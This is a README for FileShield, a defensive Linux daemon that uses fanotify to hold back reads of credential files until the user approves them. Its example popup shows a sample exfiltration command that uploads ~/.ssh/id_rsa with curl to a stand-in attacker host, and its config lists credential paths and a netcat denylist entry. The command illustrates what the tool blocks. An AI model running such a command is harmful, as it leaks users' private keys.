# FileShield

**FileShield** is a Linux security tool that intercepts and blocks file access to sensitive files (e.g., AWS secrets, SSH keys, kubeconfig) before the read completes, then prompts the user to allow or deny it. It is built on **`fanotify` permission events** — the same kernel mechanism used by Linux antivirus scanners.

> Unlike approaches based on `inotify` or `auditd` alone, FileShield uses `FAN_OPEN_PERM` events which suspend the syscall in the kernel until a decision is made. The file data is never read by the requesting process until you click Allow.

---

## Features

- **True pre-access blocking**: The kernel suspends the `open()` syscall until FileShield responds — no race condition.
- **Interactive prompts**: GUI popups (via `zenity` or `kdialog`) ask for permission before any data is exposed.
- **Flexible grants**: allow once (per-process TTL) or for the terminal session (`Allow Session`), with permanent allow/deny configured in `fileshield.conf`.
- **SRE secrets covered by default**: AWS, kubeconfig, SSH keys, GCP, Azure, Vault token, Docker config, and more — out of the box.

---

## Requirements

- Linux kernel **5.0+** (5.1+ recommended)
- `**zenity**` or `**kdialog**` (for GUI popups)

---

## Architecture

```text
Process syscall: open("/home/user/.aws/credentials", O_RDONLY)
        │
        ▼
  fanotify FAN_OPEN_PERM          ← kernel blocks syscall here
        │
        ▼
  fileshield daemon
  ├─ allowlist cache hit?  ─yes─▶  instant FAN_ALLOW
  └─ unknown process?      ─yes─▶  show GUI popup
                                        │
              ┌──────────────┬──────────┴────────┐
           Allow Once   Allow Session          Deny
              │               │                 │
        FAN_ALLOW        FAN_ALLOW          FAN_DENY
        + per-process    + session          (this attempt)
          TTL              subtree
              │
        syscall resumes (or fails with EPERM)
```

---

## Installation

### 1. Install Dependencies

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install zenity

# Fedora
sudo dnf install zenity

# Arch
sudo pacman -S zenity
```

### 2. Clone and Build

```bash
git clone https://github.com/yourusername/fileshield.git
cd fileshield
make
sudo make install
```

### 3. Start

```bash
sudo systemctl enable --now fileshield
```

The daemon requires root (`CAP_SYS_ADMIN`) to open a `fanotify` permission fd — this is a kernel requirement.

---

## Usage

Edit `fileshield.conf` to adjust protected paths, the allowlist/denylist, or the session TTL, then reload:

```bash
sudo systemctl reload fileshield
# or equivalently:
sudo kill -HUP $(pidof fileshield)
```

Sending `SIGHUP` to the daemon causes it to re-read `fileshield.conf`, remove old fanotify marks, and re-register the new set. Allowlist, denylist and TTL changes take effect at the same time.

### Default Protected Paths

FileShield ships with the following paths protected out of the box:

```ini
[protected_paths]
# --- Cloud credentials ---
~/.aws/credentials
~/.aws/config
~/.azure/
~/.config/gcloud/

# --- Kubernetes ---
~/.kube/config
~/.kube/cache/

# --- SSH ---
~/.ssh/

# --- GPG / age / SOPS ---
~/.gnupg/
~/.config/sops/

# --- Password managers & vaults ---
~/.password-store/
~/.config/op/
~/.vault-token
~/.config/vault/

# --- Container registries ---
~/.docker/config.json
~/.config/helm/repositories.yaml

# --- Terraform ---
~/.terraform.d/credentials.tfrc.json
~/.terraformrc

# --- SCM tokens ---
~/.config/gh/hosts.yml

# --- General ---
~/.netrc
~/.env
```

Paths listed in `[protected_paths]` that do not exist yet are skipped at startup with a warning. They remain covered by the filesystem mount mark, so opening the file after it is created is still intercepted; run `sudo systemctl reload fileshield` (or `kill -HUP`) to add a direct mark. The daemon refuses to start only if no configured path on any filesystem could be marked at all.

### Allowlist

The `[allowlist]` section is **empty by default**. Pre-allowlisting a binary by path is risky: if that binary is replaced, wrapped, or symlinked by a compromised package, it inherits silent access to every protected resource without any popup.

Add entries only for tools you have audited and trust at that exact path:

```ini
[allowlist]
# Format: /absolute/path/to/binary = ttl_seconds
# /usr/bin/ssh       = 3600
# /usr/bin/gpg       = 3600
```

> **Why not pre-allowlist common SRE tools?**  
> A supply-chain attack that replaces `/usr/local/bin/aws` would get unconditional access to `~/.aws/credentials` forever. An empty default forces a conscious opt-in decision per binary.

### Example Workflow

When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/user/.ssh/id_rsa`:

1. The kernel suspends the `open()` call.
2. A popup appears:

   ```text
   Process curl (PID 4521, parent: bash (PID 4518)) wants to read:
   /home/user/.ssh/id_rsa

   Binary:   /tmp/curl
   Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa

   • Allow Once    — grant access this time only
   • Allow Session — allow this binary while this terminal session lasts
   • Deny          — block this attempt
   ```

3. **Deny** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
4. **Allow Once** → `FAN_ALLOW` — access granted and cached for `user_ttl` seconds for that process instance.
5. **Allow Session** → `FAN_ALLOW` — access granted to this binary for the rest of the terminal session (see below).

### Allow Session — grant for the terminal session

**Allow Session** exists for tools like `kubectl`, `ssh` or `aws` that
are re-executed constantly: each invocation is a new PID, so a
per-process cache never helps.

- The grant is rooted at the process's session leader (your terminal
  shell) when that is one of its ancestors, otherwise at the immediate
  parent.
- Any descendant of that process may read the protected files with the
  same binary — a new `kubectl` from the same shell does not prompt.
- The grant ends when that shell exits, or after `session_ttl` seconds
  if a positive cap is configured. A new terminal always prompts.
- The binary identity (device, inode, size, mtime) is captured at grant
  time; replacing the binary on disk voids the grant.

`session_ttl` is set in `[settings]`; the default `0` means the grant
lives exactly as long as the session root.

### Permanent allow / deny (config)

Permanent decisions are not made from the popup; edit the config and
reload:

```ini
[allowlist]
# Format: /absolute/path/to/binary = ttl_seconds
# /usr/bin/ssh = 3600

[denylist]
# Never allowed, whatever the popup would say
# /usr/bin/nc
```

- **Allowlist**: canonical binary path, cached for the configured TTL
  when it matches. Prefer keeping this empty and using *Allow Session*,
  because a replaced binary at the same path inherits silent access.
- **Denylist**: canonical binary path; always wins over the allowlist
  and over cached grants, and is re-evaluated on every event.

Legacy runtime state from older versions
(`/var/lib/fileshield/runtime-allowlist.json` and
`runtime-denylist.json`) is still loaded at startup and honored, but the
popup no longer writes new entries. To clear it:

```bash
sudo rm /var/lib/fileshield/runtime-allowlist.json /var/lib/fileshield/runtime-denylist.json
sudo systemctl restart fileshield
```

---

1. The daemon calls `fanotify_init(FAN_CLASS_CONTENT, O_RDONLY | O_LARGEFILE)`.
2. It registers `FAN_OPEN_PERM` marks on each protected path via `fanotify_mark()`.
3. When a process opens a watched file, the kernel delivers a `fanotify_event_metadata` event and **blocks the calling process**.
4. The daemon resolves the binary path via `/proc/<pid>/exe` and checks the denylist, the allowlist, and the cached grants (per-process and per-session).
5. On a cache miss, it shows a `kdialog`/`zenity` popup and waits for the user's decision.
6. It writes a `struct fanotify_response` with `FAN_ALLOW` or `FAN_DENY` back to the fanotify fd.
7. The kernel unblocks the original syscall with the appropriate result.

---

## Limitations

- **Root processes**: A process running as root can bypass fanotify. FileShield protects against unprivileged or compromised user-space processes.
- **GUI dependency**: Requires a desktop session for popups.
- **Kernel version**: `fanotify` permission events on directories require kernel 5.0+.
- **Networked filesystems**: `fanotify` marks do not propagate to NFS/CIFS mounts.
- **Bind mounts and `mmap`**: `fanotify` only reports events on the mount the mark was placed on, and does not report `mmap(2)` accesses. Bind-mount aliases of protected paths, or a process that already holds an open descriptor, are outside the threat model.
- **Hard links and symlinks**: Protected paths are canonicalized at load time, so a symlinked home or config directory is still matched, and files present when the daemon starts are tracked by inode (opening one through a hard link outside the watched directories still prompts). Files created after startup are matched by their canonical path; tracking brand-new inodes via `FAN_CREATE` requires a `FAN_REPORT_FID` group and is a planned follow-up.
- **TOCTOU on binary identity**: The daemon resolves the calling process's binary via `/proc/<pid>/exe` while the process is kernel-suspended. The process cannot `execve()` at that moment, but its binary on disk could theoretically be replaced between the `readlink()` and the allowlist/cache check. This is an inherent limitation of all fanotify-based permission systems and is considered low-risk in practice.
- **Dialog rate limiting**: To bound prompt-flooding (e.g. a process that re-execs itself repeatedly), a binary path is denied without prompting after 20 prompts within 60 seconds, for a 30-second cooldown.

---

## Logs

FileShield writes all events to the system journal via `syslog(3)` under the `LOG_DAEMON` facility and the identifier `fileshield`.

### Follow live events

```bash
# systemd journal (recommended)
journalctl -u fileshield -f

# or filter by syslog identifier across all units
journalctl -t fileshield -f
```

### Query past events

```bash
# Everything since last boot
journalctl -u fileshield -b

# Last 100 lines
journalctl -u fileshield -n 100

# Only errors and above
journalctl -u fileshield -p err

# Between two timestamps
journalctl -u fileshield --since "2026-05-26 09:00" --until "2026-05-26 10:00"
```

### Log verbosity

The daemon logs at the following levels:

| Level | Events |
| ------- | -------- |
| `INFO` | Start/stop, config load, fanotify marks added/removed, reload |
| `WARNING` | Missing protected paths, failed marks, popup tool fallback, session grant not recorded |
| `ERR` | `fanotify_init` failure, config parse error, fork/exec failure |

---

## Running in Foreground (Debug Mode)

To see all log output directly in the terminal without systemd, stop the service and run the daemon in the foreground:

```bash
sudo systemctl stop fileshield
sudo ./build/fileshield --foreground --config fileshield.conf
```

When stderr is attached to a terminal, `syslog` messages are also printed there (under systemd they appear once in the journal). Combine with `strace` for deep inspection:

```bash
sudo strace -e trace=fanotify_init,fanotify_mark,read,write \
    ./build/fileshield --foreground --config fileshield.conf
```

### AddressSanitizer / UBSan build

```bash
make debug
sudo ./build/fileshield --foreground --config fileshield.conf
```

This builds with `-O0 -g -fsanitize=address,undefined` and prints any memory errors or undefined behaviour to stderr immediately.

---

## Running Tests

Unit tests cover the cache (including session grants), config parser, persistence, and utility functions. They require no root and no kernel fanotify support.

```bash
# Build and run all tests
make test

# Run a single test binary directly
./build/test_cache
./build/test_config
./build/test_persist
./build/test_fanotify
./build/test_utils
```

A passing run prints `PASS` for each suite; failures print the failing assertion and exit non-zero.

### Static analysis

```bash
make lint
```

Runs `cppcheck` over all sources in `src/` and `tests/`. Requires `cppcheck` to be installed (`apt install cppcheck` / `dnf install cppcheck`).

---

## Troubleshooting

- **No popups appear?** The daemon auto-detects the Wayland socket and D-Bus address under `/run/user/<uid>/`. Verify the desktop session is active and `kdialog` (KDE) or `zenity` (GNOME) is installed.
- **Access blocked for a trusted process?** Use *Allow Session* in the popup, or add the binary to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
- **Daemon fails to start?** Confirm the service runs as root — `fanotify_init` requires `CAP_SYS_ADMIN`. Check `journalctl -u fileshield -p err` for the exact error.
- **A path is watched but events are not firing?** Verify the mark was added successfully (`journalctl -t fileshield | grep "mark added"`). Paths on NFS/CIFS mounts or inside containers are not supported by fanotify.
- **All accesses denied with no popup on a headless machine?** FileShield requires a live desktop session to display dialogs. On headless hosts the daemon will deny all unknown accesses (fail-closed). Run in foreground mode and inspect the stderr output to confirm.

---

## License

MIT License. See [LICENSE](LICENSE) for details.
